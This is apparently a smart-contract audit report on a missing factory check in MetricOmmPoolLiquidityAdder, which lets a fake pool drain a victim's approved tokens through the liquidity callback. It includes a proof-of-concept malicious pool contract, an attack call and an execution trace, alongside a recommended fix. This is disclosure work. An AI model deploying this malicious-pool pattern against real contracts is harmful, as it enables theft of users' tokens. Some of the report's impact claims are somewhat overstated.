### Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Victim's Approved Tokens via Callback - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address from the caller without verifying it against the factory registry. A victim who has approved the adder to spend their tokens can be tricked into calling `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-deployed contract as the `pool` argument. The malicious contract calls back into `metricOmmModifyLiquidityCallback`, passes all caller-identity checks (because it IS the stored expected pool), and causes the adder to transfer up to `maxAmountToken0` and `maxAmountToken1` of any attacker-chosen tokens from the victim to the attacker.

### Finding Description

`MetricOmmPoolLiquidityAdder._addLiquidity` stores the caller-supplied `pool` address directly into transient pay context and then calls `addLiquidity` on it:

```solidity
function _addLiquidity(...) internal ... {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1); // pool is unvalidated
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) ...
``` [1](#0-0) 

When the malicious pool's `addLiquidity` is called, it immediately calls back `metricOmmModifyLiquidityCallback(max0, max1, abi.encode(KIND_PAY))`. The callback's only caller-identity guard is:

```solidity
if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
``` [2](#0-1) 

Since `expectedPool` was set to the malicious contract, `msg.sender == expectedPool` is trivially satisfied. The amount cap check `amount0Delta > max0 || amount1Delta > max1` also passes when the attacker requests exactly the cap values. The callback then calls `IMetricOmmPool(msg.sender).getImmutables()` to obtain token addresses — which the malicious pool controls — and executes:

```solidity
pay(token0, payer, msg.sender, amount0Delta);
pay(token1, payer, msg.sender, amount1Delta);
``` [3](#0-2) 

This transfers up to `maxAmountToken0` of any token the attacker specifies from the victim (`payer = msg.sender` of the original call) to the malicious pool.

**Contrast with `MetricOmmSwapRouterBase`**, which correctly validates every pool before storing it in transient context:

```solidity
function _setNextCallbackContext(address pool, ...) internal {
    _requireFactoryPool(pool); // ← factory check present
    TransientCallbackPool.set(pool, ...);
}
``` [4](#0-3) 

```solidity
function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
}
``` [5](#0-4) 

`MetricOmmPoolLiquidityAdder` has no equivalent factory check anywhere in its call path. The contract's own NatSpec acknowledges this gap:

> "This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement." [6](#0-5) 

The acknowledgment in NatSpec does not constitute a security control — it is a warning that the vulnerability exists.

### Impact Explanation

Any user who has granted a token approval to `MetricOmmPoolLiquidityAdder` can have up to their full approved balance drained in a single transaction. The attacker controls both the token addresses (via `getImmutables()`) and the amounts (up to the victim-supplied caps). This is a direct, complete loss of user principal with no recovery path once the transaction executes.

### Likelihood Explanation

The trigger requires only that a victim call `addLiquidityExactShares` or `addLiquidityWeighted` with an attacker-supplied pool address. This is a realistic phishing vector: a malicious frontend, a compromised UI, or a social-engineering attack can present a fake pool address as a legitimate one. Users who have pre-approved the adder (a common pattern for gas efficiency) are permanently at risk until they revoke the approval. No privileged access is required by the attacker.

### Recommendation

Add a factory registry check in `_addLiquidity` (or at the entry points) before storing the pool in transient context, mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
function _addLiquidity(address pool, ...) internal ... {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool); // add this
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

This requires storing the factory address as an immutable in `MetricOmmPoolLiquidityAdder`, exactly as `MetricOmmSwapRouterBase` does. Alternatively, validate at each public entry point (`addLiquidityExactShares`, `addLiquidityWeighted`) before any external call is made.

### Proof of Concept

```solidity
// Attacker deploys this contract
contract MaliciousPool {
    address immutable token; // any token victim has approved to the adder
    address immutable adder;
    address immutable attacker;

    constructor(address _token, address _adder, address _attacker) {
        token = _token; adder = _adder; attacker = _attacker;
    }

    // Mimics IMetricOmmPoolActions.addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata callbackData, bytes calldata)
        external returns (uint256, uint256)
    {
        // Call back into the adder as the "pool"
        IMetricOmmModifyLiquidityCallback(adder)
            .metricOmmModifyLiquidityCallback(
                VICTIM_MAX0, VICTIM_MAX1, callbackData // callbackData = abi.encode(KIND_PAY=1)
            );
        return (VICTIM_MAX0, VICTIM_MAX1);
    }

    // Mimics IMetricOmmPool.getImmutables()
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token; // attacker-chosen token
        imm.token1 = address(0);
    }
}

// Attack execution (victim has approved adder for `token`)
adder.addLiquidityExactShares(
    address(maliciousPool), // pool = attacker contract
    victim,
    0,
    LiquidityDelta({binIdxs: [int256(0)], shares: [uint256(1)]}),
    VICTIM_MAX0,  // maxAmountToken0 = victim's full balance
    0,            // maxAmountToken1
    ""
);
// Result: VICTIM_MAX0 of `token` transferred from victim to maliciousPool
```

**Execution trace:**
1. `addLiquidityExactShares(maliciousPool, ...)` → `_addLiquidity`
2. `_setPayContext(maliciousPool, victim, VICTIM_MAX0, 0)` — malicious pool stored as expected
3. `maliciousPool.addLiquidity(...)` called
4. `maliciousPool` calls back `metricOmmModifyLiquidityCallback(VICTIM_MAX0, 0, abi.encode(1))`
5. `kind == KIND_PAY` ✓; `msg.sender == expectedPool` ✓ (both are `maliciousPool`); `VICTIM_MAX0 <= max0` ✓
6. `token0 = maliciousPool.getImmutables().token0` → attacker's chosen token
7. `pay(token, victim, maliciousPool, VICTIM_MAX0)` → victim drained [7](#0-6) [8](#0-7) [9](#0-8)

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L152-179)
```text
  function metricOmmModifyLiquidityCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata callbackData)
    external
    override
  {
    uint8 kind = abi.decode(callbackData, (uint8));
    if (kind == KIND_PROBE) {
      revert LiquidityProbe(amount0Delta, amount1Delta);
    }
    if (kind != KIND_PAY) revert InvalidCallbackKind();

    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-195)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-32)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-85)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }
```
